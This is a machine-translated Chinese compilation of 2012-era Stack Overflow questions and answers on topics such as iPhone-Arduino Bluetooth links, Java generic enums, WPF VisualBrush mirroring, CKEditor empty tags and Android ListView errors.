1.  在顶点着色器中进行旋转。传入创建旋转矩阵所需的信息（角度？）作为顶点属性。

2.  传入一个顶点属性（ubyte），它实际上是一个每个顶点的布尔标志。仅当设置了 bool 时，才会执行 #1 中的旋转。

从性能/存储的角度来看，不确定上述内容是否适合您。

# iphone - iPhone - 任何使用蓝牙与 Arduino 板通信的示例？

> ID：11782221
> 
> 赞同：1
> 
> 时间：2012-08-02T16:54:04.450
> 
> 标签：iphone, objective-c, bluetooth, arduino, robotics

我正在修补一个由 iPhone 控制的[RC 汽车](http://en.wikipedia.org/wiki/Radio-controlled_car)底盘，它是我的**机器人项目**的基础。机箱由[WiRC](http://wirc.dension.com/) Wi-Fi 模块控制。它有八个输出来控制电子速度控制器和伺服系统。

我想提高我的机器人使用传感器避开障碍物的能力。为此，我有一块 Arduino 板，可以与各种便宜的测距仪和接近传感器连接。我正在寻找**使用蓝牙将 iPhone 连接到 Arduino 板的示例或演示项目，以向板发送命令并从板接收数据。**我想的可能吗？

感谢您提供任何指向可能使用蓝牙与 iPhone 交互的项目或硬件板的链接。如果其中一些板有 SDK 来简化开发，那就太好了。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T17:29:31.933

不幸的是，与 iOS 上设备的标准蓝牙通信仅限于 MFi 程序中的设备，因此您将无法将其与您的 Arduino 板一起使用。但是，较新的 iOS 设备（iPhone 4S、Retina iPad）支持的新蓝牙 4.0 LE 协议是开放的，可用于连接任何 LE 设备。

iOS 5.0 在 Core Bluetooth 中为此引入了一个新框架，我强烈建议您观看 WWDC 2012 上关于此的两个会议。他们也有一些关于该主题的[示例代码。](https://developer.apple.com/library/ios/#samplecode/TemperatureSensor/Introduction/Intro.html)我自己一直在使用它来连接一些传感器，它适用于温度、接近度或心率感应等低带宽应用。

那里有几个 BT LE 模块，看起来 Michael Kroll 博士即将开始生产[用于 LE 通信的 Arduino 扩展板](http://www.mkroll.mobi/?page_id=386)，这使得将这种功能添加到 Arduino 板上变得微不足道。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-09-05T15:03:44.457

您的项目可能有点晚了，但[RedBear BLE Shield](http://redbearlab.com/bleshield/)与 Arduino 结合使用效果很好。[在Building iPhone 和 iPad Electronics Projects](http://shop.oreilly.com/product/0636920029281.do)中甚至还有一个围绕这种组合构建的机器人卡车项目。

您可以使用 Objective C 访问 BLE shield，但也可以完全避免使用 Mac 并使用[techBASIC](http://www.byteworks.us/Byte_Works/techBASIC.html)，它可以让您直接从 iPhone 或 iPad 进行编程。

![使用 BLE 的 Arduino 驱动卡车的 iPhone 控制。](../Images/bdcfa05a469628a2c1882cc24d717c9a.png)

# java - Java：不能在 switch 语句中使用通用枚举

> ID：11782223
> 
> 赞同：3
> 
> 时间：2012-08-02T16:54:12.070
> 
> 标签：java, generics, parameters, enums, switch-statement

我有两种枚举类型（并希望用户能够添加自己的）。

```
enum PhoneSensor { A, B };
enum RobotSensor { A, C }; 
```

如果我不在采用 enum 类型的方法中使用 Enum 属性，这可以正常工作。

```
public <E extends Enum<E>> void registerSensor(E e) {
    System.out.print(e);
} 
```

但是，如果我希望将模板 E 识别为枚举（用于此处的开关），我会收到错误“无法打开 E 类型的值”。（在 Eclipse 中，switch(e) 中的“e”带有红色下划线）

```
public <E extends Enum<E>> void registerSensor(EnumSet<E> eSet) {
    for (E e : eSet) {
        System.out.print("value is ");
        // Cannot switch on a value of type E. 
        // Only convertible int values or enum variables are permitted
        switch(e) {
        case PhoneSensor.A:
            System.out.print(e);
        default:
            return;
        }
    }
} 
```

我对擦除有一点了解，它会在编译时清除有关模板的任何信息，所以这就是问题所在。但是我在传递 Class clazz 或实现接口方面的尝试没有奏效。有什么好的解决方案？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-02T16:59:22.913

问题是您只能打开一种已知类型。

在您的情况下，您正在尝试切换本身存在缺陷的多种可能类型。（如何期望用户在这里添加到您的代码中？）

你需要的是一个接口

```
interface Sensor {
    void sense();
}

enum PhoneSensor implements Sensor {
    A, B;

    @Override
    public void sense() {
        System.out.println(this);
    }
}

public <E extends Enum<E> & Sensor> void registerSensor(EnumSet<E> eSet) {
    for (E e : eSet) {
        System.out.print("value is ");
        e.sense();
    }
} 
```

通过这种方式，用户可以添加任何实现 Sensor 的枚举，并且他们可以做任何他们想做的事情，而无需更改您的代码。

# c# - 我可以将 XAML/WPF 窗口复制到第二个窗口中，例如画中画电视吗？

> ID：11782225
> 
> 赞同：6
> 
> 时间：2012-08-02T16:54:17.380
> 
> 标签：c#, .net, wpf, xaml

我有一个带有两个 XAML/WPF 窗口（从 NavigationWindow 派生）的应用程序，每个窗口都包含一个父 UserControl，所有子控件都放置在其中。在其中一个窗口中，我想以像画中画电视的方式显示第二个窗口的内容（实际上只是父 UserControl）。通过这种方式，用户可以查看第一个窗口，并同时查看第二个窗口中发生的情况。请注意，我不想要第二个窗口的 UserControl 的两个独立副本（这很容易），而是在第一个窗口中镜像第二个窗口的内容。

这有点类似于 Windows 7 任务栏缩略图预览，所以我认为它一定是可行的。然而，理想情况下，我还希望能够与那个窗口中的窗口进行交互，就像我拉出原始窗口一样。

这类似于[这个问题](https://stackoverflow.com/questions/10131333/screenshot-of-the-main-wpf-window-under-second-monitor-tv "这个问题")，除了我只想复制来自同一个应用程序的一个窗口，而不是整个桌面。也类似于[这个问题](https://stackoverflow.com/questions/8095636/duplicate-a-window-in-all-screens)，但我需要更多的帮助，因为我对 C#/WPF 不是很熟悉。一些代码片段会很棒。

先感谢您！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T17:21:45.160

使用视觉画笔。它不会是交互式的，但这似乎适合您的需求。

将此代码粘贴到[Kaxaml](http://kaxaml.com/)中以查看它的运行情况。

```
<Page xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
    <Page.Triggers>
        <EventTrigger RoutedEvent="Page.Loaded">
            <EventTrigger.Actions>
                <BeginStoryboard>
                    <Storyboard Storyboard.TargetName="sampleAnimation" Storyboard.TargetProperty="(FrameworkElement.RenderTransform).(RotateTransform.Angle)">
                        <DoubleAnimation Duration="00:00:10" RepeatBehavior="Forever" To="-360">
                            <DoubleAnimation.EasingFunction>
                                <ElasticEase/>
                            </DoubleAnimation.EasingFunction>
                        </DoubleAnimation>
                    </Storyboard>
                </BeginStoryboard>
            </EventTrigger.Actions>
        </EventTrigger>
    </Page.Triggers>
    <Page.Resources>
        <VisualBrush x:Key="contentBrush" Stretch="None" Visual="{Binding ElementName=content}"/>
    </Page.Resources>
    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
        </Grid.RowDefinitions>
        <TextBlock FontSize="25" Text="Content to mirror:"/>
        <Grid
            x:Name="content"
            Grid.Row="1"
            Margin="5"
            Background="#11000000"
            ClipToBounds="True">
            <TextBox
                x:Name="sampleAnimation"
                HorizontalAlignment="Center"
                VerticalAlignment="Center"
                FontSize="60"
                FontWeight="Light"
                Foreground="Red"
                RenderTransformOrigin="0.5,0.5"
                Text="Hello!">
                <TextBox.RenderTransform>
                    <RotateTransform Angle="0"/>
                </TextBox.RenderTransform>
            </TextBox>
        </Grid>
        <TextBlock Grid.Row="2" FontSize="25" Text="Mirrored content using VisualBrush:"/>
        <Grid Grid.Row="3" Background="{StaticResource contentBrush}">
        </Grid>
    </Grid>
</Page> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:00:08.447

使用视觉画笔作为矩形的填充。

您将无法与之交互......但这就是任务栏上预览缩略图的完成方式。

```
<Grid HorizontalAlignment="Left" Name="A" Height="100" Width="100">
    <Grid.Background>
        <SolidColorBrush Opacity="0" Color="White"/>
    </Grid.Background>
    <!-- Contents -->
</Grid>

<Rectangle Name="RA" VerticalAlignment="Top" Width="100" Height="100" HorizontalAlignment="Left" Stroke="Black">
    <Rectangle.Fill>
        <!-- Creates the reflection. -->
        <VisualBrush  AutoLayoutContent="True"  Visual="{Binding ElementName=A}" ViewboxUnits="RelativeToBoundingBox" ViewportUnits="RelativeToBoundingBox" Stretch="Fill" AlignmentX="Left" AlignmentY="Top" Viewport="0,0,1,1" Viewbox="0,0,1,1" TileMode="None">
        </VisualBrush>
    </Rectangle.Fill>
</Rectangle> 
```

要进行交互，您必须将所有属性绑定到相同的屏幕，并使用布局转换来缩小它。

```
<StackPanel>
    <Grid>
        <TextBox Name="A"/>
    </Grid>
    <Grid>
        <Grid.LayoutTransform>
            <ScaleTransform CenterX=".5" CenterY=".5"  ScaleX=".25" ScaleY=".25"/>
        </Grid.LayoutTransform>
        <TextBox Name="B" Text="{Binding ElementName=A, Path=Text, UpdateSourceTrigger=PropertyChanged}"/>
    </Grid>
</StackPanel> 
```

# c++ - string_t from(wstring OR string) 当 string_t 也可以是两者的 typedef

> ID：11782228
> 
> 赞同：0
> 
> 时间：2012-08-02T16:54:24.563
> 
> 标签：c++, string, templates, metaprogramming, overloading

```
namespace settings{
  typedef wchar_t char_t;
  typedef std::basic_string<char_t> string_t;
}

namespace util{
  namespace string{
    std::basic_string<wchar_t>  toWide(const std::basic_string<char>&      s);
    std::basic_string<char>     fromWide(const std::basic_string<wchar_t>& w);
  }
} 
```

这就是我所拥有的。`char_t`可能是`wchar_t`或`char`。现在我想要两个智能转换输入字符串的函数`settings::string_t`

```
settings::string_t  from(const std::basic_string<char>& s);
settings::string_t  from(const std::basic_string<wchar_t>& s); 
```

using`boost::is_same`不起作用，`return s`因为**string_t typedef'ed as wstring 但返回字符串**

```
settings::string_t util::string::from(const std::basic_string< char >& s){
  if(boost::is_same< std::basic_string<char> , settings::string_t >::value){
    return s;
  }else{
    return toWide(s);
  }
} 
```

`InputType`使用模板和重载来识别是否`string_t`相同是东方的，但如果它们不同，则有 4 种变体。

如何在**不重载类型运算符**的情况下对这种情况进行建模？

## 概括

如何设计`settings::string_t from(const std::basic_string<T>& s);`将`char`和`wchar`字符串都转换为`string_t`. 其中 T 也可以是`char`或`wchar_t`。你可以在问题中看到`string_t`是灵活的。它也可以是两者`char`或`wchar_t`字符串

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:27:52.530

我不能删除所有的重载，因为你有不同的函数来转换每个方向。我使用了结构的模板特化，但也应该可以使用重载来实现。

辅助类（及其特化）可以很容易地放置在命名空间中以移动它，因此它对用户不可见（例如，请参阅`detail`boost 下的任何命名空间）。此外，如果在没有提供必要的专业化的情况下使用某种组合，它将无法编译。

```
template<typename FromCharT, typename ToCharT>
struct helper;

// If T is the same on both sides, just copy
template<typename T>
struct helper<T, T>
{
   static std::basic_string<T> convert(const std::basic_string<T>& s)
   {
      return s;
   } 
};

// char -> wchar_t
template<>
struct helper<char, wchar_t>
{
   static std::basic_string<wchar_t> convert(const std::basic_string<char>& s)
   {
      return toWide(s);
   } 
};

// wchar_t -> char
template<>
struct helper<wchar_t, char>
{
   static std::basic_string<char> convert(const std::basic_string<wchar_t>& s)
   {
      return fromWide(s);
   } 
};

template<typename T>
settings::string_t from( const std::basic_string<T>& f)
{
   return helper<T, settings::char_t>::convert(f);
} 
```

# javascript - 无法使用javascript api在iphone上登录linkedin

> ID：11782234
> 
> 赞同：2
> 
> 时间：2012-08-02T16:54:44.020
> 
> 标签：javascript, rest, linkedin

我构建了一个使用linkedin api的webapp。当我使用 iphone 时，linkedin 登录弹出页面无法显示出来。我意识到这个问题不仅发生在我身上。

[这](https://developer.linkedin.com/forum/javascript-api-ever-going-work-iphoneipad-etc)是同样的问题。他们说的解决方案是使用 REST API 而不是 Javascript API。我只是想知道是否可以仅使用 REST API 进行登录，然后使用 Javascript API 来做其他事情？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T23:14:31.010

虽然可以将[JSAPI 令牌交换为 REST API 令牌](https://developer.linkedin.com/documents/exchange-jsapi-tokens-rest-api-oauth-tokens)，但反过来是不可能的。由于设置不记名令牌的 JSAPI 授权步骤需要不受支持的弹出窗口，因此无法设置 JS 令牌。

解决方案是使用 REST API 进行所需的调用。

# vb.net - 项目：为了评估索引属性，该属性必须是合格的，并且参数必须由用户显式提供。

> ID：11782235
> 
> 赞同：4
> 
> 时间：2012-08-02T16:54:51.963
> 
> 标签：vb.net, winforms

我创建了多个组合框，我从创建的存储过程中为每个组合框提取数据，所有这些框都在工作，直到今天早些时候，2 个组合框停止工作，检查行的“立即窗口”和列，我得到了列的结果，但是当我检查列时，例如 ?dsContactTitles.Tables(0).Rows 我得到以下列表的一部分：

```
item: In order to evaluate an indexed property, the property must be qualified and the 
arguments must be explicitly supplied by the user. 
```

否则，当我检查特定行时，我会得到一个 ArrayOutOfBoundException。这在很长一段时间内都运行良好，请问有人知道这种不一致的原因吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T18:00:41.097

由于您在即时窗口中转储整个 Rows 对象，因此您会看到 Rows 对象的属性列表。属性之一是 Item，但这需要一个索引才能显示任何有效数据，这就是消息告诉您的内容。

如果你看`?dsContactTitles.Tables(0).Rows.Item(0)`，那么您将看到第一行（如果存在）。

如果您检查特定行并获得索引越界错误，那么这意味着您不再从数据库中检索该行。尝试手动执行您的存储过程，看看它是否返回您期望的值。如果没有，您需要更新数据库或存储过程。

# javascript - ckeditor 删除空标签

> ID：11782236
> 
> 赞同：9
> 
> 时间：2012-08-02T16:54:52.397
> 
> 标签：javascript, jquery, ckeditor, fckeditor

用户插入空标签时CKEditor出现问题：

（在 HTML 源代码模式下）

```
<a href="fds" class="doIt"></a> 
```

当他按下源然后再次返回时，标签“A”消失了。我做了一点研究，我发现这是因为 ckeditor.js 中有一个非常复杂的函数来检查元素内部是否存在值。如果没有，CKEditor 会删除标签。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-02T23:56:05.167

我找到了使用标签遇到的这个特定问题的解决方案

我从[CKEditor 得到的原始答案去除了 <i> 标签](https://stackoverflow.com/questions/18250404/ckeditor-strips-i-tag/18254082#18254082)

对其进行修复或调整（您可以命名）是将以下内容设置到 ckeditors config.js 中：

```
// ALLOW <i></i>
config.protectedSource.push( /<i[\s\S]*?\>/g ); //allows beginning <i> tag
config.protectedSource.push( /<\/i[\s\S]*?\>/g ); //allows ending </i> tag 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:08:51.437

如果它不影响任何东西，请尝试添加`&nbsp;`您的 A 标签。ckeditor 验证、清理和清理 html。显然它不喜欢空的锚标签。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-03-27T20:49:48.497

我知道这很旧，但在 CKEDITOR 4.x 中你可以这样做：

```
CKEDITOR.dtd.$removeEmpty.ElementHere = 0; 
```

将 ElementHere 替换为您想要的任何标签。就像允许图标的空 i 标签一样：

```
CKEDITOR.dtd.$removeEmpty.i = 0; 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-09-02T15:53:42.733

尝试将此行添加到您的 config.js 文件中：

```
CKEDITOR.config.allowedContent = true; 
```

希望这可以帮助

# jquery - 在 html 中模拟翻转活动图块

> ID：11782237
> 
> 赞同：6
> 
> 时间：2012-08-02T16:55:07.290
> 
> 标签：jquery, html, microsoft-metro, tiles

我需要编写一些在 4 个状态之间周期性翻转的 html 方形“动态图块”。基本上我需要的是这个插件的作用[http://www.drewgreenwell.com/projects/metrojs](http://www.drewgreenwell.com/projects/metrojs)，但在 4 个状态之间，而不仅仅是 2 个。是否有一个明确的 API/插件允许在 html 中进行实时磁贴管理/jquery 网站？我不是在构建 Windows 8 应用程序，我只是想在 Html 中模拟 Live Tiles 翻转，并希望它可以在所有主要浏览器中运行。谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-03T01:55:39.060

最后，[Drew 的插件](http://www.drewgreenwell.com/projects/metrojs)似乎确实支持多个瓦片状态，他提供了几个示例。[样品 1](http://jsfiddle.net/drewgreenwell/9w98S/)和[样品 2](http://jsfiddle.net/drewgreenwell/xQUrK/)。它似乎做了我需要的动态瓷砖模拟。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-02T17:21:14.683

> 我只是想在 Html 中模拟 Live Tiles 翻转，并希望它可以在所有主要浏览器中运行

我认为这就是你所需要的。**翻动！[http://lab.smashup.it/flip/](http://lab.smashup.it/flip/)**

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T17:47:04.120

您可以考虑阅读这篇文章（下文），了解如何使用 CSS3/HTML5 过渡进行翻转。它不是 Javascript（因此没有 API），但根据我的经验，过渡效果在平滑度方面似乎更可靠一些。

[带有 CSS 的动画元素墙](http://designshack.net/articles/css/build-an-animated-photo-wall-with-css/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T17:38:01.967

这应该很容易。具体来说：

*   使用您的 N 平铺大小的内容创建一个 DIV
*   剪辑它/将父 div 大小调整为 1 平铺大小
*   确保溢出是隐藏的。
*   使用 CSS 将翻译应用于以前的内容和新内容

那么一切都应该没问题。

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-08-02T17:02:45.390

您可以使用 jQuery 或 jQuery UI 来获得此效果。jQuery 有`.animate()`、`.show()`和`.hide()`其他可以提供帮助的方法。

# view - 让视图自动使用正确的区域

> ID：11782241
> 
> 赞同：1
> 
> 时间：2012-08-02T16:55:20.363
> 
> 标签：view, tags, atk4

正如我之前的问题中提到的，我是 ATK4 的新手，目前正在学习，所以可能会有更多问题。现在到我的问题。

我`Sidebar`在我的模板中创建了一个区域“”`shared.html`并将视图添加到它，如下所示：

```
class Frontend extends ApiFrontend {
    function init(){
        parent::init();

        /* 
            Other stuff here
        */

        $this->addLayout('Sidebar');
    }

    function layout_Sidebar() {
        $this->add('View_Menu', null, 'Sidebar');
    }
} 
```

然后我正在创建这样的视图：

```
class View_Menu extends AbstractView {
    function init(){
        parent::init();

        $this->add('HtmlElement')
            ->setElement('a')
            ->setAttr('href', 'testurl')
            ->set('Link');
    }
} 
```

这给了我以下错误：

```
Spot is not found in owner's template

Additional information:

    spot: Content 
```

提供 add 函数`$this->template->top_tag`作为第三个参数解决了这个问题：

```
$this->add('HtmlElement', null, $this->template->top_tag)
    ->setElement('a')
    ->setAttr('href', 'testurl')
    ->set('Link'); 
```

...但是我真的必须将它添加到视图中的每个 add() 调用中吗？这似乎不对，我很确定不是！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T02:30:07.560

创建 AbstractView 时，需要指定默认模板。默认情况下，您的 AbstractView 将使用 shared.html 中的区域。换句话说，AbstractObject 假定它替换的区域的模板。

当您创建 defaultTemplate() 或将第四个参数传递给 add() 时，您可以指定一个不同的文件用于侧边栏菜单的模板。

无论哪种方式 - 模板都应包含将显示任何子元素的输出的位置。

您可以从“View”类继承，该类已经依赖于仅包含 . 您使用 HtmlElement 的想法就是这样，因为 HtmlElement 扩展了 View。

# android - ListView 无法解析

> ID：11782243
> 
> 赞同：1
> 
> 时间：2012-08-02T16:55:29.583
> 
> 标签：android, android-listview

大家。我对这段代码的这段摘录有疑问：

```
cocktailListView.setAdapter(adapter); 
```

鸡尾酒列表视图无法解析

我的整个代码是：

```
public class SearchCustomListViewActivity extends ListActivity {
    //ArrayList thats going to hold the search results
    ArrayList<HashMap<String, Object>> searchResults;

    //ArrayList that will hold the original Data
    ArrayList<HashMap<String, Object>> originalValues;
    LayoutInflater inflater;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.main);
        final EditText searchBox=(EditText) findViewById(R.id.searchBox);
        ListView playerListView=(ListView) findViewById(android.R.id.list);

        //get the LayoutInflater for inflating the customomView
        //this will be used in the custom adapter
        inflater=(LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);

        //these arrays are just the data that
        //I'll be using to populate the ArrayList
        //You can use our own methods to get the data
        String names[]={"Ronaldo","Messi","Torres","Iniesta",
                "Drogba","Gerrard","Rooney","Xavi"};

        String teams[]={"Real Madrid","Barcelona","Chelsea",
                "Barcelona","Chelsea","Liverpool",
                "ManU","Barcelona"};
        Integer[] photos={R.drawable.amazonas,R.drawable.amazonas,
                R.drawable.amazonas,R.drawable.amazonas,
                R.drawable.amazonas,R.drawable.amazonas,
                R.drawable.amazonas,R.drawable.amazonas};

        originalValues=new ArrayList<HashMap<String,Object>>();

        //temporary HashMap for populating the
        //Items in the ListView
        HashMap<String , Object> temp;

        //total number of rows in the ListView
        int noOfPlayers=names.length;

        //now populate the ArrayList players
        for(int i=0;i<noOfPlayers;i++)
        {
            temp=new HashMap<String, Object>();

            temp.put("name", names[i]);
            temp.put("team", teams[i]);   
            temp.put("photo", photos[i]);

            //add the row to the ArrayList
            originalValues.add(temp);       
        }
        //searchResults=OriginalValues initially
        searchResults=new ArrayList<HashMap<String,Object>>(originalValues);

        //create the adapter
        //first param-the context
        //second param-the id of the layout file
        //you will be using to fill a row
        //third param-the set of values that
        //will populate the ListView
        final CustomAdapter adapter=new CustomAdapter(this, R.layout.players_layout,searchResults);

        //finally,set the adapter to the default ListView
        cocktailListView.setAdapter(adapter);
        searchBox.addTextChangedListener(new TextWatcher() {
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                //get the text in the EditText
                String searchString=searchBox.getText().toString();
                int textLength=searchString.length();
                searchResults.clear();

                for(int i=0;i<originalValues.size();i++)
                {
                    String playerName=originalValues.get(i).get("name").toString();
                    if(textLength<=playerName.length()){
                        //compare the String in EditText with Names in the ArrayList
                        if(searchString.equalsIgnoreCase(playerName.substring(0,textLength)))
                            searchResults.add(originalValues.get(i));
                    }
                }

                adapter.notifyDataSetChanged();
            }

            public void beforeTextChanged(CharSequence s, int start, int count, int after) {}

            public void afterTextChanged(Editable s) {}
        });
    }

    //define your custom adapter
    private class CustomAdapter extends ArrayAdapter<HashMap<String, Object>>
    {
        public CustomAdapter(Context context, int textViewResourceId,
                ArrayList<HashMap<String, Object>> Strings) {
            //let android do the initializing :)
            super(context, textViewResourceId, Strings);
        }

        //class for caching the views in a row 
        private class ViewHolder
        {
            ImageView photo;
            TextView name,team;
        }
        ViewHolder viewHolder;

        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            if(convertView==null)
            {
                convertView=inflater.inflate(R.layout.players_layout, null);
                viewHolder=new ViewHolder();

                //cache the views
                viewHolder.photo=(ImageView) convertView.findViewById(R.id.photo);
                viewHolder.name=(TextView) convertView.findViewById(R.id.name);
                viewHolder.team=(TextView) convertView.findViewById(R.id.team);

                //link the cached views to the convertview
                convertView.setTag(viewHolder);
            }
            else
                viewHolder=(ViewHolder) convertView.getTag();

            int photoId=(Integer) searchResults.get(position).get("photo");

            //set the data to be displayed
            viewHolder.photo.setImageDrawable(getResources().getDrawable(photoId));
            viewHolder.name.setText(searchResults.get(position).get("name").toString());
            viewHolder.team.setText(searchResults.get(position).get("team").toString());

            //return the view to be displayed
            return convertView;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T16:58:33.857

你还没有实例化`cocktailListView`。

您需要在您的`onCreate(...)`. 您可以在实例化`playerListView`.

> 来自埃斯皮安德夫
> 
> `ListView cocktailListView = getListView();`

或者

```
ListView cocktailListView = 
    (ListView) this.findViewById(/* id of your list view*/); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:53:36.863

当您`ListActivity`在布局中使用 ListView 时，应该有一个精确的 id：

```
 android:id="@id/android:list" 
```

只有在这种情况下，您才能真正使用`getListView`而无需获得 npe。

从文档：

> ListActivity 有一个默认布局，它由屏幕中央的单个全屏列表组成。但是，如果您愿意，您可以通过在 onCreate() 中使用 setContentView() 设置您自己的视图布局来自定义屏幕布局。为此，您自己的视图必须包含一个 ID 为“@android:id/list”的 ListView 对象（如果它在代码中，则为列表）

# java - onKeyUp 文本字段自动生成。HTML/JAVA

> ID：11782248
> 
> 赞同：0
> 
> 时间：2012-08-02T16:55:44.003
> 
> 标签：java, javascript, html, textfield

我有一个代码使用户能够在第一个 TextBox 中输入一个值，并且我希望它在具有相同 ID 的其他 TextField 中填充相同的值。（一列中有 9 个文本字段具有相同的 ID）

这是我的代码，但问题是该值仅在第一个收件箱（TextF1）中填充，其他 8 个没有任何反应。有没有人在这里看到问题

```
<form >
<input type='text' id='VarField' onKeyUp="document.getElementById('VarField1').value=this.value"  value='' size="10">

<input type='text' name='TextF1' id='VarField1' value='' size="10">
<input type='text' name='TextF2' id='VarField1' value='' size="10">
<input type='text' name='TextF3' id='VarField1' value='' size="10">
.
.
.
<input type='text' name='TextF8' id='VarField1' value='' size="10">
<input type='text' name='TextF9' id='VarField1' value='' size="10">
</form> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:17:54.633

HTML 元素的 ID 应该是唯一的。我的意思是只有一个元素应该有 ID VarField1。

您可以尝试为每个元素赋予相同的 VarField1 类。然后，您可以使用 for-each 循环为每个元素赋予正确的值。看起来像这样：

```
function assignValue( textValue )
{
    for ( textBox in document.getElementsByClassName("VarField1") )
    {
        textBox.value = textValue;
    }
} 
```

您的 onKeyUp 属性只会使用文本框的值调用 assignVale() 函数。

`onKeyUp="assignValue(this.value)"`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:20:31.863

拥有多个具有相同 ID 的标签是不好的做法 - 因此，该`getElementById`方法仅访问具有该 ID 的第一个标签。相反，为每个输入提供相同的类，选择所有输入，然后遍历它们。

所以你的代码看起来像这样（我将函数与 onKeyUp 事件分开以使其更易于查看）：

```
<script type="text/javascript">
    function writeText()
    {
        var textFields = document.getElementsByClassName("VarField1");
        for(i = 0; i < textFields.length; i++)
        {
            textFields[i].value = document.getElementById("VarField").value;
        }
    }
</script>

<form >
    <input type='text' id='VarField' onKeyUp="writeText()"  value='' size="10">

    <input type='text' name='TextF1' class='VarField1' value='' size="10">
    <input type='text' name='TextF2' class='VarField1' value='' size="10">
    <input type='text' name='TextF3' class='VarField1' value='' size="10">
    <input type='text' name='TextF8' class='VarField1' value='' size="10">
    <input type='text' name='TextF9' class='VarField1' value='' size="10">
</form> 
```

请注意，您必须以这种方式进行迭代 - 尽管使用 foreach (for ... in) 循环很诱人，但这对于返回的 NodeList 不起作用`getElementsByClassName`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:21:47.947

我认为，问题在于您不能在具有相同 ID 的页面上拥有多个控件/元素。尝试给他们不同的 ID（例如`Varfield2`,`Varfield2`等）。那应该可以解决问题。

# iphone - Webview 内富文本中的 URL 链接

> ID：11782249
> 
> 赞同：1
> 
> 时间：2012-08-02T16:55:48.773
> 
> 标签：iphone, xcode, webview, richtextbox, richtext

我一直试图弄清楚这个问题，但我似乎无法找到答案。我有一个正在开发的应用程序，它在 WebView 中包含富文本，我希望能够在其中添加一个超链接，但我只是不知道如何。

这是我的代码：

```
+(NSArray*)getSampleData 
```

{

```
NSString* content0 = @"<b><u>For Printer Models:</b></u> IJ2040, 3000, 3160\. </p><p>Cable Part Number: CD-023A. </p><p>Connector: RJ12\. </p><p>Interface Type: <ul><li><p>12 Volt MultiPRO II: 420</li></p><li><p>12/24 Volt MultiPRO III: 520.</ul></p><p>Manufacturer Website: www.addmaster.com"; 
```

}

```
BusinessService* service0 = [[BusinessService alloc] initWithCaption:@"Addmaster" andImage:[UIImage imageNamed:@"interface.jpg"] andWebContentTitle:@"Connectors for Addmaster" andWebContent:content0 andWebContentImage:[UIImage imageNamed:@"interface.jpg"]]; 
```

现在我希望能够直接从 webview 链接到 www.addmaster.com，以便任何阅读该链接的人都可以单击链接打开 safari。请让我知道是否可能。非常感谢您的帮助。

# asp.net-mvc - 自定义 IModelBinder 中的 NullReferenceException

> ID：11782250
> 
> 赞同：1
> 
> 时间：2012-08-02T16:55:51.970
> 
> 标签：asp.net-mvc, .net-4.5, modelbinder

我正在尝试在 .NET 4.5 中使用 MVC4 实现我自己的自定义 ModelBinder，但遇到了最奇怪的错误。我的代码看起来大约。像这样

表视图模型模型：IModelBinder

```
public object BindModel(ControllerContext ctx, BindingContext btx)
{
    IEnumerable<String> sSearch = ctx.HttpContext.Request.Params.Keys.OfType<String().Where(key => key.StartsWith("sSearch_"));
    ...
} 
```

NullReferenceException 已在第一行抛出，但实际上没有一个属性为 null（它们都出现在 intellisense 调试中）。在绝望中，我决定删除一些属性，以便更好地了解引发异常的位置，我发现罪魁祸首是 Params 属性。真正奇怪的是，查询字符串中的所有键都列在调试窗口中，但仍然抛出异常。我真的需要一些帮助这个人！

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T09:14:43.347

使用 Reflector 发现错误并分析堆栈跟踪。事实证明，调用堆栈 HttpRequest.Params 的某处试图读取我的 Principal 对象 (HttpContext.User) 的 Identity 属性。我有一个 IPrincipal 的自定义实现，它不初始化 Identity 对象 - 你有它。

非常感谢那些花时间阅读我的问题的人。

# android - android:vmSafeMode 的默认值是多少？

> ID：11782251
> 
> 赞同：2
> 
> 时间：2012-08-02T16:56:05.270
> 
> 标签：android

我试图更多地了解 JIT 编译器优化。此优化是否自动启用？为什么我不想启用此选项？

这是我的清单 sdk 目标：

```
<uses-sdk
        android:minSdkVersion="4"
        android:targetSdkVersion="15" /> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-05-29T18:45:31.237

默认情况下，启用 JIT 编译器优化，这意味着默认 vmSafeMode 设置为“false”，因此通过将其设置为“true”，您将关闭 JIT 编译器。当然，如果设备在不支持 JIT 的 API 级别 8 (froyo) 下运行操作系统；它不应该有任何区别。

*（来源：）*

